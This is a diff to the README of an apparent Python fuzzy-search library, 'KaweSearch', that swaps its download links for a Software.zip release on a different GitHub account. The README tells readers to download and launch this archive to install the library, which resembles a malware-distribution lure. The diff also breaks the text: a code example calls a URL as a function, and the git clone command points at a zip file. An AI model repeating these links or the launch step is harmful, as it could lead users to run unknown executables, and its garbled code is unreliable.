@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "KaweSearch" Repository! 🌟
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Welcome to the "KaweSearch" repository! This library provides a powerful fuzzy s
 
 You can download the software by clicking on the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)
 
 **Note:** The downloaded software needs to be launched for installation.
 
@@ -62,7 +62,7 @@ from kawesearch import KaweSearch
 search = KaweSearch()
 
 # Perform a fuzzy search
-results = search.fuzzy_search("example", threshold=0.8, algorithm="damerau-levenshtein")
+results = https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip("example", threshold=0.8, algorithm="damerau-levenshtein")
 
 # Print the results
 print(results)
@@ -72,7 +72,7 @@ print(results)
 
 ## Get Started
 
-1. Clone the repository: `git clone https://github.com/your-username/kawesearch.git`
+1. Clone the repository: `git clone https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip`
 2. Explore the examples provided in the repository to understand how to integrate KaweSearch into your projects.
 3. Customize the search options to meet your specific requirements.
 4. Share your feedback and contribute to the repository by creating pull requests.
@@ -103,4 +103,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for choosing KaweSearch for your fuzzy search needs! 🌟🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)](https://github.com/joel6666666666555555555555553333333333/kawesearch/releases/download/v2.0/Software.zip)
